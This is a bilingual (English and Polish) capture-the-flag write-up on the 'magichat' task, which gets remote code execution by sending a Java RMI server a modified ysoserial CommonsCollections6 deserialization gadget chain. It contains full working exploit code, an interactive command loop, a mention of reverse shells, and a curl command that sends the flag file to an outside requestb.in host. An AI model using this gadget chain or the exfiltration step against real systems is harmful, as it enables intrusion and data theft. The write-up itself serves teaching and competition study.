# magichat (pwn, 321p, 9 solved)

[pl](#pl-version)

in the task we get a [client](magic_hat_client.jar) for java rmi application.
we can add this jar as a library in intellij idea project, and it will decompile the code for us.

the code is rather simple, we establish a connection via rmi with the server and then we can place some objects inside hat object, and send it to the server.
server takes those objects and does some operations on them.

```java
properties props = system.getproperties();
props.setproperty("javax.net.ssl.truststore", "magic_hat_truststore");
props.setproperty("javax.net.ssl.truststorepassword", "magic_hat");
registry registry = locateregistry.getregistry(inetaddress.getbyname("magichat.teaser.insomnihack.ch").gethostname(), 51966, new sslrmiclientsocketfactory());
wizardapi wizardapi = (wizardapi)registry.lookup("wizard");
//
hat magichat = wizardapi.getmagichat();
//
magichat.add(new wand());
//
pair<string, hat> answer = wizardapi.castaspell(magichat);
magichat = (hat)answer.getright();
system.out.println((string)answer.getleft());
```

rmi has 2 types of objects which can be passed between remote endpoints - remote objects (passed as proxies), and serializable objects, passed in serialized form.
in our case every artifact we can place in the hat is serializable.
the hat itself is simply:

```java
public class hat extends artifact {
    private bag content = new hashbag();

    public void add(artifact a) {
        this.content.add(a);
    }

    public string tostring() {
        string str = super.tostring();
        if (!this.content.isempty()) {
            str = str + " that contains: \n" + this.content.tostring().replace(":", "x ").replace(',', '\n');
        }
        return str;
    }
}
```

the vulnerability here is that server endpoint deserializes objects we send. 
it might later crash with `classcastexception` if the objects were not of the expected type, but they will be deserialized before that happens.
it's also worth understanding that java doesn't have notion of generic types at runtime.
pretty much any collection type can store any objects, also of totally unrelated types.
it means we can store anything in the `hashbag` in `hat` class.

we used slightly modified payload from [ysoserial](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/commonscollections6.java).
we use the same approach, but instead of `hashset` we create `hashbag`, we also used `whitebox` to skip all the reflection madness:

```java
private static hat preparepayload(string command) {
	// like in commonscollections6
	string[] execargs = new string[]{command};
	transformer[] transformers = new transformer[]{new constanttransformer(runtime.class), new invokertransformer("getmethod", new class[]{string.class, class[].class}, new object[]{"getruntime", new class[0]}), new invokertransformer("invoke", new class[]{object.class, object[].class}, new object[]{null, new object[0]}), new invokertransformer("exec", new class[]{string.class}, execargs), new constanttransformer(1)};
	transformer transformerchain = new chainedtransformer(transformers);
	map innermap = new hashmap();
	map lazymap = lazymap.decorate(innermap, transformerchain);
	tiedmapentry entry = new tiedmapentry(lazymap, "foo");
	hashbag bagwithexploit = new hashbag();
	bagwithexploit.add(new object());

	map internalmap = whitebox.getinternalstate(bagwithexploit, "map");
	object[] nodesarray = whitebox.getinternalstate(internalmap, "table");
	object node = arrays.stream(nodesarray)
			.filter(objects::nonnull)
			.findfirst()
			.orelsethrow(() -> new runtimeexception("this can't happen"));
	whitebox.setinternalstate(node, "key", entry);

	hat hat = new hat();
	whitebox.setinternalstate(hat, "content", bagwithexploit);
	return hat;
}
```

now we can simply send this `hat` to the server to invoke `command`.
we run the exploit with:

```java
    public static void main(final string[] args) throws exception {
        properties props = system.getproperties();
        props.setproperty("javax.net.ssl.truststore", "magic_hat_truststore");
        props.setproperty("javax.net.ssl.truststorepassword", "magic_hat");
        registry registry = locateregistry.getregistry(inetaddress.getbyname("magichat.teaser.insomnihack.ch").gethostname(), 51966, new sslrmiclientsocketfactory());
        wizardapi wizard = (wizardapi) registry.lookup("wizard");
        scanner sc = new scanner(system.in);
        while (true) {
            system.out.print("> ");
            execcommand(wizard, sc.nextline());
        }
    }

    private static void execcommand(wizardapi wizard, string command) {
        try {
            wizard.castaspell(preparepayload(command));
        } catch (exception e) {
        }
    }
```

and we basically have rce on the server, although without immediate echo, but we can always drop a reverse-shell.
after some poking around we find the `flag.txt` file in `/home/magic-hat` so we can grab it with:

`curl -d @/home/magic-hat/flag.txt -x post https://requestb.in/blablabla`

and we get: `ins{lol_ur_a_lizard_gary!}`

### pl version

w zadaniu dostajemy [klienta](magic_hat_client.jar) dla aplikacji java rmi.
możemy dodać ten jar jako bibliotekę w intellij idea żeby automatycznie zobaczyć zdekompilowany kod.

kod jest dość prosty, łączymy się z serwerem za pomocą rmi, następnie możemy dodać pewne obiekty do obiektu hat a potem wysłać je do serwera.
serwer bierze te obiekty i wykonuje na nich pewne operacje.

```java
properties props = system.getproperties();
props.setproperty("javax.net.ssl.truststore", "magic_hat_truststore");
props.setproperty("javax.net.ssl.truststorepassword", "magic_hat");
registry registry = locateregistry.getregistry(inetaddress.getbyname("magichat.teaser.insomnihack.ch").gethostname(), 51966, new sslrmiclientsocketfactory());
wizardapi wizardapi = (wizardapi)registry.lookup("wizard");
//
hat magichat = wizardapi.getmagichat();
//
magichat.add(new wand());
//
pair<string, hat> answer = wizardapi.castaspell(magichat);
magichat = (hat)answer.getright();
system.out.println((string)answer.getleft());
```

rmi pozwala na przekazywanie pomiędzy zdalnymi klientami 2 typów obiektów - obiekty remote (przesyłane jako proxy) oraz obiekty serializable, w formie zserializowanej.
w naszym przypadku wszystkie artefakty które możemy umieścić w hat są serializable.
klasa hat to po prostu:

```java
public class hat extends artifact {
    private bag content = new hashbag();

    public void add(artifact a) {
        this.content.add(a);
    }

    public string tostring() {
        string str = super.tostring();
        if (!this.content.isempty()) {
            str = str + " that contains: \n" + this.content.tostring().replace(":", "x ").replace(',', '\n');
        }
        return str;
    }
}
```

podatność w tym zadaniu polega na tym, że serwer musi zdeserializować obiekty które mu przesyłamy.
później może to wysypać program z `classcastexception` jeśli wyślemy obiekty nieoczekiwanego typu, ale mimo wszystko muszą zostać zdeserializowane.
warto pamiętać też że java nie ma na poziomie wykonania czegoś takiego jak typy generyczne.
każda kolekcja obiektów może przechowywać obiekty dowolnych, niezwiązanych ze sobą, typów.
to oznacza że w obiekcie `hashbag` w klasie `hat` możemy przechowywać cokolwiek.

użyliśmy lekko zmodyfikowanego payloadu z [ysoserial](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/commonscollections6.java).
używamy tego samego podejścia ale zamiast `hashset` tworzmy `hashbag`. 
używamy też `whitebox` żeby pozbyć się całego szaleństwa związanego z refleksją.

```java
private static hat preparepayload(string command) {
	// like in commonscollections6
	string[] execargs = new string[]{command};
	transformer[] transformers = new transformer[]{new constanttransformer(runtime.class), new invokertransformer("getmethod", new class[]{string.class, class[].class}, new object[]{"getruntime", new class[0]}), new invokertransformer("invoke", new class[]{object.class, object[].class}, new object[]{null, new object[0]}), new invokertransformer("exec", new class[]{string.class}, execargs), new constanttransformer(1)};
	transformer transformerchain = new chainedtransformer(transformers);
	map innermap = new hashmap();
	map lazymap = lazymap.decorate(innermap, transformerchain);
	tiedmapentry entry = new tiedmapentry(lazymap, "foo");
	hashbag bagwithexploit = new hashbag();
	bagwithexploit.add(new object());

	map internalmap = whitebox.getinternalstate(bagwithexploit, "map");
	object[] nodesarray = whitebox.getinternalstate(internalmap, "table");
	object node = arrays.stream(nodesarray)
			.filter(objects::nonnull)
			.findfirst()
			.orelsethrow(() -> new runtimeexception("this can't happen"));
	whitebox.setinternalstate(node, "key", entry);

	hat hat = new hat();
	whitebox.setinternalstate(hat, "content", bagwithexploit);
	return hat;
}
```

tak przygotowany `hat` możemy teraz wysłać do serwera, co spowoduje wykonanie `command`.
uruchamiamy ten exploit przez:

```java
    public static void main(final string[] args) throws exception {
        properties props = system.getproperties();
        props.setproperty("javax.net.ssl.truststore", "magic_hat_truststore");
        props.setproperty("javax.net.ssl.truststorepassword", "magic_hat");
        registry registry = locateregistry.getregistry(inetaddress.getbyname("magichat.teaser.insomnihack.ch").gethostname(), 51966, new sslrmiclientsocketfactory());
        wizardapi wizard = (wizardapi) registry.lookup("wizard");
        scanner sc = new scanner(system.in);
        while (true) {
            system.out.print("> ");
            execcommand(wizard, sc.nextline());
        }
    }

    private static void execcommand(wizardapi wizard, string command) {
        try {
            wizard.castaspell(preparepayload(command));
        } catch (exception e) {
        }
    }
```

w ten sposób mamy generalnie rce na serwerze, chociaż bez echa, ale możemy zawsze uruchomić sobie reverse-shell.
po chwili rozglądania się po serwerze znajdujemy plik `flag.txt` w `/home/magic-hat` i możemy pobrać go przez:

`curl -d @/home/magic-hat/flag.txt -x post https://requestb.in/blablabla`

dostajemy: `ins{lol_ur_a_lizard_gary!}`
